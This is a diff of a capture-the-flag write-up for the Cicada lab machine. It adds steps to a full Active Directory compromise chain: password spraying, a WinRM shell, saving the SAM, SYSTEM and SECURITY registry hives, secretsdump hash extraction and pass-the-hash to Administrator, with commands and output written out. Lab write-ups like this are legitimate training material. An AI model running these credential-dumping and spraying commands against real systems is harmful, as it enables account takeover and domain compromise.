@@ -16,10 +16,20 @@ The machine rewards patience and thoroughness: a default password is hiding in a
 ```
 Nmap → SMB guest login → HR share → default password in notice file
 → RID brute force → domain user list → password spray → michael.wrightson
-→ BloodHound + --users → david.orelious password in AD description
+→ BloodHound (no attack paths) → nxc --users → david.orelious password in AD description
 → DEV share → Backup_script.ps1 → emily.oscars credentials
-→ Evil-WinRM → SeBackupPrivilege → reg save SAM/SYSTEM
-→ secretsdump → Administrator NTLM hash → Pass-the-Hash → root
+→ Evil-WinRM (user flag) → SeBackupPrivilege → reg save SAM/SYSTEM/SECURITY
+→ secretsdump → Administrator NTLM hash → Pass-the-Hash → root flag
+```
+
+---
+
+## Setup
+
+Before running any commands, add the machine to `/etc/hosts` so that `cicada.htb` and `CICADA-DC.cicada.htb` resolve to the target IP. Without this, SMB auth with domain accounts, Evil-WinRM, and BloodHound collection will all fail:
+
+```bash
+echo '<DC_IP> cicada.htb CICADA-DC.cicada.htb' | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -139,6 +149,12 @@ Save these five usernames to a file (`users.txt`) — we'll use them for the spr
 
 ## Initial Access — Password Spray (`michael.wrightson`)
 
+> **Before any spray:** Always check the domain's account lockout policy first — a threshold of even 3 attempts will lock accounts. Many DCs allow guest or null sessions to query it:
+> ```bash
+> nxc smb cicada.htb -u "guest" -p "" --pass-pol
+> ```
+> On this machine there is no lockout threshold (confirmed in the AD Enumeration section), so we can spray freely.
+
 Now spray the default password from the HR notice against all five accounts. The `--continue-on-success` flag makes sure NetExec doesn't stop at the first hit:
 
 ```bash
@@ -210,7 +226,7 @@ The CA is present but not published in Active Directory — there's no enrollmen
 
 ### Password Policy Check
 
-Before spraying further, verify the lockout policy:
+We have valid credentials now — let's pull the full policy to confirm we can spray further without risk of account lockouts:
 
 ```bash
 nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p '<DEFAULT_PASSWORD>' --pass-pol
@@ -251,14 +267,23 @@ nxc smb CICADA-DC.cicada.htb -u david.orelious -p '<REDACTED>' --shares
 ```
 
 ```
-DEV    READ
+SMB  <DC_IP>  445  CICADA-DC  [+] cicada.htb\david.orelious:<REDACTED>
+SMB  <DC_IP>  445  CICADA-DC  Share        Permissions  Remark
+SMB  <DC_IP>  445  CICADA-DC  -----        -----------  ------
+SMB  <DC_IP>  445  CICADA-DC  ADMIN$                    Remote Admin
+SMB  <DC_IP>  445  CICADA-DC  C$                        Default share
+SMB  <DC_IP>  445  CICADA-DC  DEV          READ
+SMB  <DC_IP>  445  CICADA-DC  HR           READ
+SMB  <DC_IP>  445  CICADA-DC  IPC$         READ          Remote IPC
+SMB  <DC_IP>  445  CICADA-DC  NETLOGON     READ          Logon server share
+SMB  <DC_IP>  445  CICADA-DC  SYSVOL       READ          Logon server share
 ```
 
 `david.orelious` has READ on the `DEV` share that was locked to guest.
 
 ---
 
-## Privilege Escalation Path — `emily.oscars`
+## Credential Discovery — `emily.oscars`
 
 ### Credential Discovery in Backup Script
 
@@ -309,6 +334,12 @@ evil-winrm -i <DC_IP> -u emily.oscars -p '<REDACTED>'
 cicada\emily.oscars
 ```
 
+Grab the user flag from emily's desktop before moving on:
+
+```bash
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> type C:\Users\emily.oscars.CICADA\Desktop\user.txt
+```
+
 ---
 
 ## Full Domain Compromise — SeBackupPrivilege
@@ -337,7 +368,7 @@ BloodHound confirms it: `emily.oscars` is a member of the **Backup Operators** b
 
 ### Dumping the SAM and SYSTEM Hives
 
-Save both registry hives to disk from within the Evil-WinRM session:
+Save all three registry hives to disk from within the Evil-WinRM session. SAM holds local account hashes, SYSTEM contains the boot key needed to decrypt them, and SECURITY holds LSA secrets including cached domain credentials — you need all three for a complete dump:
 
 ```bash
 *Evil-WinRM* PS C:\windows\temp> reg save HKLM\SAM C:\Windows\Temp\sam
@@ -345,13 +376,17 @@ The operation completed successfully.
 
 *Evil-WinRM* PS C:\windows\temp> reg save HKLM\SYSTEM C:\Windows\Temp\system
 The operation completed successfully.
+
+*Evil-WinRM* PS C:\windows\temp> reg save HKLM\SECURITY C:\Windows\Temp\security
+The operation completed successfully.
 ```
 
-Download both files to your attacking machine using Evil-WinRM's built-in download function:
+Download all three files to your attacking machine using Evil-WinRM's built-in download function:
 
 ```bash
 *Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\sam
 *Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\system
+*Evil-WinRM* PS C:\windows\temp> download C:\Windows\Temp\security
 ```
 
 ### Extracting Hashes with Secretsdump
@@ -359,7 +394,7 @@ Download both files to your attacking machine using Evil-WinRM's built-in downlo
 Pass both files to `secretsdump.py` for offline hash extraction:
 
 ```bash
-secretsdump.py -sam sam -system system LOCAL
+secretsdump.py -sam sam -system system -security security LOCAL
 ```
 
 ```
@@ -385,10 +420,11 @@ cicada\administrator
 
 Full domain compromise. The root flag is on the Administrator's desktop.
 
-> **Alternative:** This can also be done without a shell using the NetExec `backup_operator` module:
+> **Alternative — NetExec `backup_operator` module:** If you have a user with SeBackupPrivilege or Backup Operators membership but prefer not to drop a shell first, NetExec can automate the hive extraction in one step:
 > ```bash
 > nxc smb <DC_IP> -u emily.oscars -p '<REDACTED>' -M backup_operator
 > ```
+> This replaces the manual `reg save` + download steps and outputs the SAM/SYSTEM hashes directly — you still pass-the-hash the result the same way. It requires the same privilege (Backup Operators group membership), so it will not work with lower-privileged accounts.
 
 ---
 
@@ -403,6 +439,6 @@ Full domain compromise. The root flag is on the Administrator's desktop.
 | AD enumeration | BloodHound collection, ADCS ruled out, no lockout policy | NetExec, Certipy |
 | Lateral movement | Password stored in `david.orelious` AD description field | NetExec |
 | Credential discovery | `emily.oscars` password hardcoded in `Backup_script.ps1` | smbclient |
-| Shell access | `emily.oscars` in Remote Management Users → WinRM shell | Evil-WinRM |
-| Privilege escalation | Backup Operators → SeBackupPrivilege → reg save SAM/SYSTEM | reg, secretsdump |
+| Shell + user flag | `emily.oscars` in Remote Management Users → WinRM shell → user.txt | Evil-WinRM |
+| Privilege escalation | Backup Operators → SeBackupPrivilege → reg save SAM/SYSTEM/SECURITY | reg, secretsdump |
 | Full compromise | Administrator NTLM hash → Pass-the-Hash | Evil-WinRM |
